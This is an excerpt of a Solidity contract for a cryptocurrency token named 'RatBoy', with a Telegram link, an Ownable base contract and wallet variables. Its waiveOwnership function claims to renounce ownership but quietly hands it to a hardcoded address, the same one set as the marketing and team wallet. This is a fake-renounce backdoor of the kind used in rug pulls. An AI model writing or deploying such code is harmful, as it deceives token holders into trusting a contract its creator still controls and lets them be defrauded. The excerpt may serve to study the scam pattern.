...
/**
Telegram : https://t.me/RatboyRatboyRatboyBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x45A9C6cf826c74C28730a66F0Bc8B5dE845dA980);
    }
...
contract RatBoy is Context, IERC20, Ownable {
    ...
    string private _symbol = "RTBY";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x45A9C6cf826c74C28730a66F0Bc8B5dE845dA980);
    address payable private teamWalletAddress = payable(0x45A9C6cf826c74C28730a66F0Bc8B5dE845dA980);
